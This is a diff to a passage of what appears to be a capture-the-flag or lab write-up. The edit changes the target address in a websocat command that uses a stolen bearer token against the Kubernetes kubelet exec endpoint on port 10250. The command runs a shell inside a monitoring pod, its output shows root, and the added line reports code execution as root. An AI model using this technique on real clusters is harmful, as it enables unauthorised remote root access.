@@ -729,7 +729,7 @@ kube-system/metrics-server-c8774f4f4-phw6q -> ["metrics-server"]
 I then query the pods to find a suitable one i can use for RCE on the SSH session since thats the host with the port `10250` running
 
 ```python
-nightfall@fireflow:~$ websocat --insecure --header "Authorization: Bearer $TOKEN" --protocol v4.channel.k8s.io "wss://127.0.0.1:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=/bin/sh&command=-c&command=id"
+nightfall@fireflow:~$ websocat --insecure --header "Authorization: Bearer $TOKEN" --protocol v4.channel.k8s.io "wss://10.129.244.214:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=/bin/sh&command=-c&command=id"
 
 uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
 {"metadata":{},"status":"Success"}
@@ -738,6 +738,8 @@ uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
 websocat: WebSocketError: I/O failure
 websocat: error running
 ```
+
+I now have code execution as root!
 
 
 
